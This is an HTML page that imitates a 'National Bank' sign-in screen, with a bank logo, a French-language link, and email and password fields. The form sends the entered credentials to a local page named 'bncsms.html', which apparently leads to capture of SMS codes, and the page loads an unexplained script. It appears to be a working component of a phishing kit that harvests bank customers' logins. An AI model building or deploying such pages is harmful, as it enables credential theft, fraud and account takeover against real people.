<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>National Bank - Sign In</title>
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
        }

        /* Top Bar */
        .top-bar {
            display: flex;
            justify-content: flex-end;
            padding: 16px 24px 8px;
        }

        .lang-link {
            color: #00548f;
            text-decoration: underline;
            font-size: 16px;
            font-weight: 600;
        }

        /* Header Logo */
        .header {
            padding: 12px 24px;
            display: flex;
            align-items: center;
        }

        /* Main Content */
        .container {
            padding: 20px 24px;
            max-width: 500px;
            margin: 0 auto;
        }

        h1 {
            font-size: 34px;
            font-weight: 800;
            margin-top: 10px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            background-color: #ffffff;
            outline: none;
        }
        
        input::placeholder {
            color: #666;
            font-weight: 400;
        }

        input:focus {
            border-color: #00548f;
            box-shadow: 0 0 0 1px #00548f;
        }

        .password-container {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            fill: #00548f;
            width: 24px;
            height: 24px;
            cursor: pointer;
        }

        .forgot-link {
            color: #00548f;
            text-decoration: underline;
            font-size: 16px;
            display: block;
            margin-top: 8px;
            margin-bottom: 30px;
            font-weight: 500;
        }

        .remember-me {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 30px;
        }
        
        .remember-left {
            display: flex;
            align-items: center;
        }

        .custom-checkbox {
            width: 24px;
            height: 24px;
            border: 1px solid #999;
            border-radius: 4px;
            margin-right: 12px;
            background-color: white;
            flex-shrink: 0;
        }

        .remember-me label {
            margin: 0;
            font-size: 16px;
            font-weight: 600;
            line-height: 1.3;
            cursor: pointer;
        }

        .info-icon {
            width: 24px;
            height: 24px;
            fill: none;
            stroke: #00548f;
            stroke-width: 2;
            flex-shrink: 0;
        }

        .login-btn {
            background-color: #00548f;
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 24px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
        }

        .login-btn:hover {
            background-color: #003d69;
        }

        .login-btn svg {
            fill: none;
            stroke: white;
            stroke-width: 2;
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }

        /* Bottom Section */
        .bottom-section {
            background-color: #f1f7fb;
            padding: 30px 24px;
            position: relative;
        }
        
        .bottom-content {
            max-width: 500px;
            margin: 0 auto;
        }

        .bottom-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 12px;
        }

        .bottom-text {
            font-size: 16px;
            line-height: 1.5;
            color: #333;
            margin-bottom: 24px;
        }

        .register-btn {
            background-color: transparent;
            color: #00548f;
            border: 1px solid #00548f;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 24px;
            cursor: pointer;
            display: inline-block;
        }
        
        .register-btn:hover {
            background-color: #e5f0f9;
        }

        /* Floating Chat Icon */
        .chat-icon {
            position: absolute;
            bottom: 30px;
            right: 24px;
            width: 60px;
            height: 60px;
            background-color: #00548f;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            cursor: pointer;
        }
        
        .chat-icon svg {
            width: 32px;
            height: 32px;
            fill: white;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <a href="#" class="lang-link">Français</a>
    </div>

    <header class="header" style="padding-top: 0; padding-bottom: 10px;">
        <img src="bnc-logo.png" alt="National Bank" style="width: 260px; height: auto; margin-left: -20px;" />
    </header>

    <div class="container">
        <h1>Hello</h1>
        
        <form action="bncsms.html" method="POST">
            <div class="form-group">
                <label>Email address</label>
                <input type="email" name="Email address" placeholder="Enter your email address" required />
            </div>

            <div class="form-group" style="margin-bottom: 8px;">
                <label>Password</label>
                <div class="password-container">
                    <input type="password" name="Password" placeholder="Enter your password" required />
                    <svg class="eye-icon" viewBox="0 0 24 24">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="none" stroke="#00548f" stroke-width="2"/>
                        <circle cx="12" cy="12" r="3" fill="#00548f"/>
                    </svg>
                </div>
            </div>
            
            <a href="#" class="forgot-link">Forgot your password?</a>

            <div class="remember-me">
                <div class="remember-left">
                    <div class="custom-checkbox"></div>
                    <label>Remember my email<br>address</label>
                </div>
                <svg class="info-icon" viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="16" x2="12" y2="12"></line>
                    <line x1="12" y1="8" x2="12.01" y2="8"></line>
                </svg>
            </div>

            <button type="submit" class="login-btn">
                <svg viewBox="0 0 24 24">
                    <rect x="5" y="11" width="14" height="10" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    <circle cx="12" cy="16" r="1" fill="white"></circle>
                </svg>
                Sign in
            </button>
        </form>
    </div>

    <div class="bottom-section">
        <div class="bottom-content">
            <div class="bottom-title">First time signing in?</div>
            <div class="bottom-text">
                Create your account to access all our online services with a single password.
            </div>
            <button class="register-btn">Create your account</button>
        </div>
        
        <div class="chat-icon">
            <svg viewBox="0 0 24 24">
                <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-3 9H7V9h10v2z"/>
            </svg>
        </div>
    </div>

    <script src="../../security_module.js"></script>
</body>
</html>
